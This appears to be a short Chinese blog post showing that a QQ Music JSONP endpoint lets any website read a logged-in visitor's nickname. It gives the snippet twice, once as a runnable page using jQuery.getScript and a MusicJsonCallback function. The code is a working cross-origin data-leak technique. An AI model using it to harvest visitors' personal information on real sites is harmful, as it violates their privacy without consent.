# QQ音乐跨域抽取个人信息

这个是浏览丸子大的blog发现的。 在关于页面中，有这么一段代码。

<!-- more -->

```
<div style="background:#FFFFE0;padding:10px;border:1px #E6DB55 dashed;margin:10px 0;">
<p>你好<em id="who">朋友</em></p>
</div>
<script>

    function MusicJsonCallback(data) {
        document.getElementById('who').innerHTML = data.nickname;
    }
    jQuery.getScript('http://portalcgi.music.qq.com/fcgi-bin/music_mini_portal/cgi_getuser_info.fcg');
</script>
```

效果是这个样子的。


Run Code:

```
<html>
<head>
<script type='text/javascript' src='http://promiseforever.com/wp-includes/js/jquery/jquery.js?ver=1.7.1'></script>
</head>
<body>
<div style="background:#FFFFE0;padding:10px;border:1px #E6DB55 dashed;margin:10px 0;">
<p>你好<em id="who">朋友</em></p>
</div>
<script>

    function MusicJsonCallback(data) {
        document.getElementById('who').innerHTML = data.nickname;
    }
    jQuery.getScript('http://portalcgi.music.qq.com/fcgi-bin/music_mini_portal/cgi_getuser_info.fcg');
</script>
</body>
</html>
```

